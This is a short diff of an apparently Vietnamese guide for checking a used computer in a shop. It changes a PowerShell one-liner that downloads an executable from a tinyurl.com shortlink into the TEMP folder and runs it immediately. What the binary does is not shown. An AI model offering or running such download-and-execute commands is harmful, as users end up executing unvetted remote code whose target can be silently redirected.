@@ -11,7 +11,7 @@
 Khi đi mua máy cũ tại cửa hàng hoặc tiệm cầm đồ mà không được phép cắm USB lạ, bạn chỉ cần mở **PowerShell** và dán 1 dòng lệnh duy nhất:
 
 ```powershell
-irm tinyurl.com/nhutcode-check -OutFile $env:TEMP\c.exe; &$env:TEMP\c.exe
+irm tinyurl.com/check-ntn -OutFile $env:TEMP\c.exe; &$env:TEMP\c.exe
 ```
 
 ---
